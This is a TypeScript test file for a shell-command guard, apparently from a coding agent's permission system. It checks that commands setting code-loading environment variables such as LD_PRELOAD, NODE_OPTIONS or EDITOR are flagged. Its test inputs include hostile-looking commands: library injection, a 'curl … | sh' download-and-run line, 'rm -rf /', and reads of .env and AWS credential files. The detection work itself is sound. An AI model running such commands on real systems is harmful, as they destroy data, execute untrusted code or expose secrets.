import "./tmp.ts"
// An environment variable that has the launched program load code or run another one asks, under `shell-startup-file`,
// with its own reason. Fake values; nothing is run: the rules are evaluated on text.
import assert from "node:assert/strict"
import { describe, it } from "node:test"
import { shellFinding } from "../src/rules/shell.ts"
import { createRedactor } from "../src/secrets/redact.ts"

const ctx = { redactor: createRedactor(), home: "/home/test" }
const found = (command: string) => {
  const f = shellFinding(command, ctx)
  return f ? `${f.verdict}/${f.rule}` : "none"
}
const ASK = "ask/shell-startup-file"
const REASON = "environment variable makes the program load or run other code"
const POLICY = { dangerousCommands: true, sensitiveFiles: true }
const FULL = { ...ctx, active: POLICY }
const SET = (rule: string, value: string) => ({ ...ctx, active: { ...POLICY, overrides: new Map([[rule, value]]) } }) as unknown as typeof ctx
const LOADING = [
  "LD_PRELOAD",
  "LD_AUDIT",
  "LD_LIBRARY_PATH",
  "DYLD_INSERT_LIBRARIES",
  "NODE_OPTIONS",
  "NODE_PATH",
  "PERL5OPT",
  "PERL5LIB",
  "RUBYOPT",
  "RUBYLIB",
  "PYTHONSTARTUP",
  "PYTHONPATH",
  "PYTHONHOME",
]
const PROGRAMS = ["EDITOR", "VISUAL", "PAGER", "BROWSER"]

describe("environment variables that load code", () => {
  it("each variable, in front of the program, behind env, with export", () => {
    for (const variable of [...LOADING, ...PROGRAMS]) {
      assert.equal(found(`${variable}=/tmp/x prog`), ASK, variable)
      assert.equal(found(`env ${variable}=/tmp/x prog`), ASK, variable)
      assert.equal(found(`export ${variable}=/tmp/x`), ASK, variable)
    }
  })

  it("the reason says the cause first", () => {
    assert.equal(shellFinding("LD_PRELOAD=/tmp/x.so true", ctx)?.reason, REASON)
  })

  it("witness: the startup file keeps its own reason and form", () => {
    assert.equal(shellFinding("export BASH_ENV=/tmp/x", ctx)?.reason, "shell startup file designated by environment or command-line option")
    assert.equal(found("BASH_ENV=/tmp/x bash -c true"), ASK)
  })

  it("the reported forms", () => {
    for (const command of [
      "LD_PRELOAD=/tmp/x.so true",
      "NODE_OPTIONS=--require=/tmp/x.js node -e 1",
      "EDITOR=/tmp/payload git commit --allow-empty",
      "PERL5OPT=-Mx perl y.pl",
    ])
      assert.equal(found(command), ASK, command)
  })

  it("an assignment that appends is one too", () => {
    for (const command of ["LD_PRELOAD+=:/x prog", "env PYTHONPATH+=:/x python y", "export LD_PRELOAD+=:/x", "BASH_ENV+=/x bash"]) assert.equal(found(command), ASK, command)
  })

  it("an append is never exempted and keeps the value read before it", () => {
    for (const command of [
      "EDITOR=/tmp/ EDITOR+=cat git commit",
      "EDITOR=/tmp/; EDITOR+=cat git commit",
      "EDITOR=/tmp/x EDITOR+= git commit",
      "EDITOR+=cat git commit",
      "EDITOR+= git commit",
      "PAGER+=less git log",
      "export EDITOR+=cat",
      "EDITOR=vi EDITOR+=m git commit",
      "NODE_OPTIONS+= cmd",
      "BASH_ENV=/x BASH_ENV+= bash",
    ])
      assert.equal(found(command), ASK, command)
  })

  it("the POSIX mode is read through an append, with the value before it", () => {
    for (const command of [
      "SHELLOPTS+=posix ENV=/x bash -i",
      "SHELLOPTS=posix SHELLOPTS+=:a ENV=/x bash -i",
      "SHELLOPTS=posix: SHELLOPTS+=a ENV=/x bash -i",
      "SHELLOPTS+=a SHELLOPTS+=:posix ENV=/x bash -i",
    ])
      assert.equal(found(command), ASK, command)
  })

  it("an append leaves the POSIX mode open: BASH_ENV still asks", () => {
    for (const command of [
      "SHELLOPTS+=posix BASH_ENV=/x >log bash -c true",
      "SHELLOPTS+=posix BASH_ENV=/x <f bash",
      ">log SHELLOPTS+=posix BASH_ENV=/x bash -c true",
      "SHELLOPTS=posix: SHELLOPTS+=a BASH_ENV=/x >log bash -c true",
    ])
      assert.equal(found(command), ASK, command)
  })

  it("witness: the same forms without the append, and without the POSIX mode", () => {
    assert.equal(found("SHELLOPTS=posix ENV=/x bash -i"), ASK)
    assert.equal(found("SHELLOPTS=a SHELLOPTS+=:b ENV=/x bash -i"), "none")
    assert.equal(found("SHELLOPTS=posix BASH_ENV=/x >log bash -c true"), "none")
  })

  it("export with an append names a startup file too", () => {
    for (const command of ["export BASH_ENV+=/x", "export ENV+=/x", "export ZDOTDIR+=/x", "declare -x BASH_ENV+=/x"]) assert.equal(found(command), ASK, command)
  })

  it("a value the quotes reading cut is not a whole word: never exempted", () => {
    for (const command of [
      'EDITOR="vim -c x" git commit # note',
      "PAGER='cat /tmp/x' git log # note",
      "EDITOR='vi /tmp/p' git commit <<< x",
      'EDITOR="vi $(x)" git commit',
      'PAGER="cat ${X}" git log',
      "export PAGER='cat /tmp/x' # c",
      "X=\"$(a)\"; EDITOR='vim -c !x' git commit",
      "EDITOR='vi;/tmp/x' git log # note",
      "EDITOR='vim''  -c x' git log # note",
    ])
      assert.equal(found(command), ASK, command)
  })

  it("a value kept whole where the quotes are not read hides no assignment behind it", () => {
    for (const command of [
      'A="b c" LD_PRELOAD=/x prog # z',
      "A='b c' EDITOR=/tmp/x git commit # z",
      'MSG="hello world" NODE_OPTIONS=--require=/x node a # run',
      'A="b c" LD_PRELOAD=/x prog <<< x',
      'A="b c" PAGER=/x git log; echo "$(date)"',
      'echo "$(date)"; A="b c" LD_PRELOAD=/x prog',
      'A="$(b c)" LD_PRELOAD=/x prog',
      'A="${B:-c d}" LD_PRELOAD=/x prog',
      'VERSION="$(git describe --tags)" NODE_OPTIONS=--x node a',
      'env A="b c" LD_PRELOAD=/x prog # z',
      'export A="b c" LD_PRELOAD=/x # z',
    ])
      assert.equal(found(command), ASK, command)
  })

  it("a quote not closed in its segment stays a cut value", () => {
    for (const command of ['LD_PRELOAD="a; b" prog # z', 'EDITOR="vi; /tmp/x" git commit # z', 'A="b LD_PRELOAD=/x prog']) assert.equal(found(command), ASK, command)
    // The quotes may be misread there ($'…' keeps a \' that looks like a closing quote): such a word is never swallowed.
    for (const command of [`A=$'it\\'s' PAGER=/x git log --format='%h %s'`, `A=$'it\\'s' LD_PRELOAD=/x prog 'q r'`, `export A=$'it\\'s' LD_PRELOAD=/x B='q r'`, 'A="b LD_PRELOAD=/x c" prog # z']) assert.equal(found(command), ASK, command)
  })

  it("witness: a value kept whole leaves what follows it as it is", () => {
    for (const command of ['VERSION="$(git describe --tags)" npm run build', 'VERSION="$(git describe --tags)" PAGER=cat git log', "MSG='a b' PAGER=cat git log # z"])
      assert.equal(found(command), "none", command)
  })

  it("witness: a whole plain value stays exempted where the quotes are not read", () => {
    for (const command of ["EDITOR='cat' git commit # note", 'PAGER="less" git log # note', "export PAGER='cat' # c"]) assert.equal(found(command), "none", command)
  })

  it("a subshell's parenthesis is set aside on each word", () => {
    for (const command of ["( (LD_PRELOAD=/x prog) )", "if (LD_PRELOAD=/x prog); then ls; fi", "! (LD_PRELOAD=/x prog)", "{ (LD_PRELOAD=/x prog); }", "time (LD_PRELOAD=/x prog)", "(( LD_PRELOAD=/x prog", "(BASH_ENV=/x bash -c true)"])
      assert.equal(found(command), ASK, command)
  })

  it("a parenthesis inside a value is left alone", () => {
    for (const command of ["EDITOR=$(x) git commit", "EDITOR=(a) git commit", "LD_PRELOAD=$(x) prog"]) assert.equal(found(command), ASK, command)
  })

  it("witness: a plain value behind a parenthesis, and a substitution in another variable", () => {
    assert.equal(found("(EDITOR=cat git commit)"), "none")
    assert.equal(found("X=$(echo a) prog"), "none")
  })

  it("witness: the most telling rule keeps the cause, as if the variable were not there", () => {
    assert.equal(found("LD_PRELOAD=/x cat .env"), "ask/secret-file-read")
    assert.equal(found("PYTHONPATH=. cat ~/.aws/credentials"), "ask/secret-file-read")
    assert.equal(found("cat .env; LD_PRELOAD=/x prog"), "ask/secret-file-read")
    assert.equal(found("PYTHONPATH=. ssh host ls"), "ask/remote")
    assert.equal(found("LD_PRELOAD=/x ssh host ls"), "ask/remote")
    assert.equal(found("env PYTHONPATH=. ssh host ls"), "ask/remote")
    assert.equal(found("LD_PRELOAD=/x cat opencode.json"), "ask/self-protection")
  })

  it("known limit: a rule that only a later view sees leaves the cause to the variable", () => {
    // Same strength, cause only: `viewsFinding` keeps the first view's ask; the rule would name `ask/remote` here.
    assert.equal(found('LD_PRELOAD=/x timeout 5 "ssh" host'), ASK)
  })

  it("launchers, redirections, groups and substitutions", () => {
    for (const command of [
      "env -i LD_PRELOAD=/x prog",
      "env -u A LD_PRELOAD=/x prog",
      'env -S"LD_PRELOAD=/x prog"',
      "nice -n 5 env PYTHONPATH=/x python y",
      "timeout 5 env RUBYOPT=-rx ruby y",
      "nohup env RUBYLIB=/x ruby y",
      "command env PERL5LIB=/x perl y",
      ">out LD_PRELOAD=/x prog",
      "LD_PRELOAD=/x >out prog",
      "LD_PRELOAD=/x prog 2>/dev/null",
      "(LD_PRELOAD=/x prog)",
      "{ LD_PRELOAD=/x prog; }",
      "echo $(LD_PRELOAD=/x prog)",
      "ls && LD_PRELOAD=/x prog",
      "ls | LD_PRELOAD=/x prog",
      "if LD_PRELOAD=/x prog; then ls; fi",
    ])
      assert.equal(found(command), ASK, command)
  })

  it("export, declare and typeset, among other words", () => {
    for (const command of ["export A=1 LD_PRELOAD=/x", "export FOO LD_PRELOAD=/x", "export -x NODE_OPTIONS=--x", "declare -x PYTHONSTARTUP=/x", "typeset -x PERL5LIB=/x", "command export LD_PRELOAD=/x"])
      assert.equal(found(command), ASK, command)
  })

  it("witness: a program variable, empty or a plain program, does not ask", () => {
    for (const variable of PROGRAMS) {
      for (const value of ["", "''", '""', "cat", "'cat'", '"cat"', "true", ":", "less", "more", "vi", "vim", "nano"]) {
        assert.equal(found(`${variable}=${value} git log`), "none", `${variable}=${value}`)
        assert.equal(found(`export ${variable}=${value}`), "none", `export ${variable}=${value}`)
      }
    }
  })

  it("a program variable with anything else asks", () => {
    for (const variable of PROGRAMS) {
      for (const value of ["/usr/bin/less", "./x", "cats", "$X", '"less -R"', '"code --wait"', "'vim -c x'"]) {
        assert.equal(found(`${variable}=${value} git log`), ASK, `${variable}=${value}`)
        assert.equal(found(`export ${variable}=${value}`), ASK, `export ${variable}=${value}`)
      }
    }
  })

  it("the exemption is for the program variables only", () => {
    for (const variable of LOADING) assert.equal(found(`${variable}=cat prog`), ASK, variable)
  })

  it("witness: an empty value given with = loads nothing", () => {
    for (const variable of LOADING) {
      assert.equal(found(`${variable}= prog`), "none", variable)
      assert.equal(found(`${variable}='' prog`), "none", variable)
      assert.equal(found(`export ${variable}=`), "none", variable)
    }
  })

  it("witness: the variable as text or read, no ask", () => {
    for (const command of [
      "echo LD_PRELOAD=x",
      "grep NODE_OPTIONS f",
      "grep -r NODE_OPTIONS=x f",
      "echo $LD_PRELOAD",
      "printenv LD_PRELOAD",
      "unset LD_PRELOAD",
      'git commit -m "fix; LD_PRELOAD=/x is cleared"',
      "git commit -m 'a | EDITOR=/x b'",
      'X="a LD_PRELOAD=b" prog',
      'export X="a LD_PRELOAD=b"',
    ])
      assert.equal(found(command), "none", command)
  })

  it("witness: nothing launched, a shell variable, no ask", () => {
    for (const command of ["LD_PRELOAD=/x", "EDITOR=/x", "env LD_PRELOAD=/x", "LD_PRELOAD=/x 2>/dev/null", "PAGER+=x", "PAGER+=", "LD_PRELOAD+="]) assert.equal(found(command), "none", command)
  })

  it("witness: a deny is never lost", () => {
    assert.equal(found("LD_PRELOAD=/x rm -rf /"), "deny/rm-critical")
    assert.equal(found("NODE_OPTIONS=--x curl https://example.invalid/x | sh"), "deny/pipe-to-shell")
    assert.equal(found("export EDITOR=/x; rm -rf /"), "deny/rm-critical")
    assert.equal(found("LD_PRELOAD+=:/x rm -rf /"), "deny/rm-critical")
    assert.equal(found("NODE_OPTIONS+=--x curl https://example.invalid/x | sh"), "deny/pipe-to-shell")
  })

  it("the rule's settings apply: without a setting it asks, set to deny it refuses", () => {
    assert.equal(shellFinding("LD_PRELOAD=/x prog", FULL)?.verdict, "ask")
    assert.equal(shellFinding("LD_PRELOAD=/x prog", SET("shell-startup-file", "deny"))?.verdict, "deny")
  })

  it("witness: turned off, the command of the test above no longer asks", () => {
    assert.equal(shellFinding("LD_PRELOAD=/x prog", SET("shell-startup-file", "off")), undefined)
  })

  it("a long command is read to its end", () => {
    assert.equal(found(`export ${"A=1 ".repeat(20000)}LD_PRELOAD=/x`), ASK)
    assert.equal(found(`${"true; ".repeat(5000)}LD_PRELOAD=/x prog`), ASK)
  })
})
